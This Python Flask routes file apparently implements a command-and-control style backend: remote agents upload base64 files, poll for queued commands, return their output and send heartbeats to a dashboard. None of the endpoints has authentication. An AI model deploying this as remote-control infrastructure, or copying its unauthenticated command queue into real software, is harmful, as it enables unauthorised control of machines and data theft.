# apps/api/routes.py
# -*- encoding: utf-8 -*-
import base64, io
from datetime import datetime
import threading

from flask import Blueprint, request, jsonify, send_file

from apps.api.agent_state import update_agent  # для heartbeat

api = Blueprint('api', __name__)

lock = threading.Lock()

# ---------- File transfer storage ----------
files = {}  # {agent_id: {filename: {"content": bytes, "ts": float}}}

@api.route('/api/agent/<agent_id>/file', methods=['POST'])
def receive_file(agent_id):
    data = request.json or {}
    name = (data.get("name") or "").strip()
    b64  = (data.get("data") or "").strip()
    if not name or not b64:
        return jsonify({"error": "name and data are required"}), 400

    try:
        raw = base64.b64decode(b64)
    except Exception as e:
        return jsonify({"error": f"bad base64: {e}"}), 400

    with lock:
        files.setdefault(agent_id, {})[name] = {
            "content": raw,
            "ts": datetime.utcnow().timestamp()
        }
    return jsonify({"status": "stored", "name": name})

@api.route('/api/agent/<agent_id>/files/latest', methods=['GET'])
def download_latest(agent_id):
    bucket = files.get(agent_id) or {}
    if not bucket:
        return "No files for this agent", 404
    name, meta = max(bucket.items(), key=lambda kv: kv[1]["ts"])
    return send_file(
        io.BytesIO(meta["content"]),
        as_attachment=True,
        download_name=name
    )

# ---------- Commands ----------
commands = {}  # {agent_id: "command"}

@api.route('/api/agent/<agent_id>/command', methods=['POST'])
def send_command(agent_id):
    data = request.json or {}
    cmd = (data.get('command') or "").strip()
    if not cmd:
        return jsonify({'error': 'Command is required'}), 400
    commands[agent_id] = cmd
    return jsonify({'status': 'Command queued'})

@api.route('/api/agent/<agent_id>/get_command', methods=['GET'])
def get_command(agent_id):
    cmd = commands.pop(agent_id, None)
    return jsonify({'command': cmd})

# ---------- Command results ----------
results = {}  # {agent_id: "output"}

@api.route('/api/agent/<agent_id>/output', methods=['POST'])
def receive_output(agent_id):
    data = request.json or {}
    output = data.get("output", "")
    results[agent_id] = output
    return jsonify({"status": "output received"})

@api.route('/api/agent/<agent_id>/get_output', methods=['GET'])
def get_output(agent_id):
    return jsonify({"output": results.pop(agent_id, "")})

# ---------- Heartbeat (обязательно нужен для дашборда) ----------
@api.route('/api/heartbeat', methods=['POST'])
def heartbeat():
    data = request.json or {}
    if 'id' not in data:
        return jsonify({'error': 'Invalid payload'}), 400
    update_agent(data['id'], data, request.remote_addr)
    return jsonify({'status': 'ok'})
